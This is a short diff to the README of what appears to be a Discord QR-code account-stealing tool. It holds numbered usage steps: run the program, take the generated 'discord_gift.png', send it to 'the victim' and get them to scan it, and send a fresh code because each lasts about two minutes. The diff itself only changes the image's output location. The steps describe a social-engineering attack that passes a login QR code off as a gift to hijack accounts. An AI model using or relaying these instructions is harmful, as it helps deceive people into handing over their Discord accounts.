@@ -39,7 +39,7 @@ OR
 
 3. Run `py start.py` in cmd to run the program
 
-4. Wait for the `discord_gift.png` to be generated inside the `image` folder. Send the image to the victim and make them scan it.
+4. Wait for the `discord_gift.png` to be generated in the current working directory. Send the image to the victim and make them scan it.
 
 5. QR Code only lasts about 2 minutes. Make sure you send a fresh one to the victim and he is ready to scan.
 
